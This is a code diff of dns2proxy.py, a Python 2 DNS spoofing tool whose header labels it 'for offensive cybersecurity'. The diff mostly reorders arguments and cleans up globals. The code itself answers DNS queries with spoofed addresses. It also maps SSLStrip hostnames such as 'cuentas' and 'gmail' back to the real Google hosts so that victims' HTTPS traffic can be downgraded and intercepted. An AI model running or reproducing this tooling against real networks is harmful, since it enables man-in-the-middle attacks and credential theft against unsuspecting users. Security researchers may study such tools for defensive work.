@@ -1,6 +1,14 @@
-# Usage: python2.6 dns2proxy.py <IPdnsserver> <routingIP> <interface>
+#!/usr/bin/python2.6
+
+# dns2proxy for offensive cybersecurity V0.8
 #
-# Example: python2.6 dns2proxy.py 192.168.1.101 192.168.1.200 eth0
+#
+# Usage: python2.6 dns2proxy.py <interface> <IPdnsserver> <routingIP> 
+#
+# Example: python2.6 dns2proxy.py eth0 192.168.1.101 192.168.1.200 
+#
+# Author: Leonardo Nve ( leonardo.nve@gmail.com)
+#
 #
 
 import dns.message
@@ -18,18 +26,12 @@ import signal
 import errno
 from time import sleep
 
-#dev = 'eth0'
-#ip  = '192.168.1.101'
-#ip2  = '192.168.1.200'
 
 debug = 1
 
-prov_ip = ''
-prov_resp = ''
-
 dev = sys.argv[1]
 
-adminip = '172.16.48.100'
+adminip = '192.168.1.80'
 
 consultas = {}
 spoof = {}
@@ -239,8 +241,6 @@ def parse_packet(packet):
 ######################
 
 def respuestas(name, type):
-    global prov_ip
-    global prov_resp
     global Resolver
 
     print 'Query = ' + name + ' ' + type
@@ -249,13 +249,10 @@ def respuestas(name, type):
     except Exception, e:
         print 'Exception...'
         return 0
-    prov_resp = answers[0]
-    #print 'Victim: %s   Answer 0: %s'%(prov_ip,prov_resp)
     return answers
 
 
 def requestHandler(address, message):
-    global prov_ip
     resp = None
     try:
         message_id = ord(message[0]) * 256 + ord(message[1])
@@ -397,14 +394,9 @@ def std_AAAA_qry(msg):
 
 
 def std_A_qry(msg,prov_ip):
-    qs = msg.question
-    #global prov_ip
-    global prov_resp
     global consultas
+    qs = msg.question
     print str(len(qs)) + ' questions.'
-
-    #answers = []
-    #nxdomain = False
     resp = make_response(qry=msg)
     for q in qs:
         qname = q.name.to_text()[:-1]
@@ -418,6 +410,7 @@ def std_A_qry(msg,prov_ip):
             ttl = 1
             id = host[:punto]
             print 'Alert domain! ID: '+id
+            # Here the HANDLE!
             #os.popen("python /yowsup/yowsup-cli -c /yowsup/config -s <number> \"Host %s\nIP %s\" > /dev/null &"%(id,prov_ip));
             save_req(LOGALERTFILE,'Alert domain! ID: '+id+'\n')
             print 'Responding with IP = '+ dominios[dominio]
@@ -430,36 +423,31 @@ def std_A_qry(msg,prov_ip):
             return std_ASPOOF_qry(msg)
 
         ips = respuestas(qname.lower(), 'A')
-	#print "%d answers"%len(ips)
         if isinstance(ips,numbers.Integral) and not specificspoof.has_key(qname.lower()):
-			host2=''
-			if host[:5]=='wwww.' or host[:7]=='social.':
-				host2='www%s'%(dominio)
-			elif host[:3]=='web':
-				host2 = host[3:]
-			elif host[:7]=='cuentas':
-				host2 = 'accounts%s'%(dominio)
-			elif host[:5]=='gmail':
-				host2 = 'mail%s'%(dominio)
-			elif host=='chatenabled.gmail.google.com':   # Yes, It is ugly....
-				host2 ='chatenabled.mail.google.com'
-
-			if host2!='':
-				print 'SSLStrip transforming host: %s => %s ...'%(host,host2)
-				ips = respuestas(host2,'A')
+            host2=''
+            if host[:5]=='wwww.' or host[:7]=='social.':
+            	host2='www%s'%(dominio)
+            elif host[:3]=='web':
+            	host2 = host[3:]
+            elif host[:7]=='cuentas':
+            	host2 = 'accounts%s'%(dominio)
+            elif host[:5]=='gmail':
+            	host2 = 'mail%s'%(dominio)
+            elif host=='chatenabled.gmail.google.com':   # Yes, It is ugly....
+            	host2 ='chatenabled.mail.google.com'
+            if host2!='':
+            	print 'SSLStrip transforming host: %s => %s ...'%(host,host2)
+            	ips = respuestas(host2,'A')
 
         #print '>>> Victim: %s   Answer 0: %s'%(prov_ip,prov_resp)
+        prov_resp = ips[0]
         consultas[prov_ip] = prov_resp
-        #print consultas
 
         if isinstance(ips, numbers.Integral):
             print 'No host....'
             resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
             return resp
 
-        #consultas.keys()
-        #prov_ip = ''
-        #prov_resp = ''
 
         ttl = 1
         if host not in nospoof:
@@ -570,4 +558,3 @@ while True:
     if noserv:
     	DEBUGLOG('serving a request.')
     	requestHandler(address, message)
-    
